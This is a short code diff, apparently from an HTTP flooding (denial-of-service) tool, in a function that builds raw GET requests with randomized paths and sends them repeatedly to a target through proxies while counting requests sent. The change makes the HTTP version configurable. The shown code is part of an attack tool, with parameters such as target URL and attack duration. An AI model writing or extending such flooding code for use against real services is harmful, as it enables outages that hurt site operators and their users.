@@ -298,8 +298,8 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
                         try:
                             # build packet
                             headers = ''.join([f'{key}: {value}\r\n' for key,value in buildheaders(target_url, useragent, referer).items()])
-                            packet = f'GET /{buildblock("/")} HTTP/1.1\r\nHost: {host}:{str(port)}\r\n{headers}\r\n'.encode()
-                            
+                            packet = f'GET /{buildblock("/")} HTTP/{Core.http_version}\r\nHost: {host}:{str(port)}\r\n{headers}\r\n'.encode()
+
                             s.send( packet )
 
                             Core.infodict[worker_id]['req_sent'] += 1
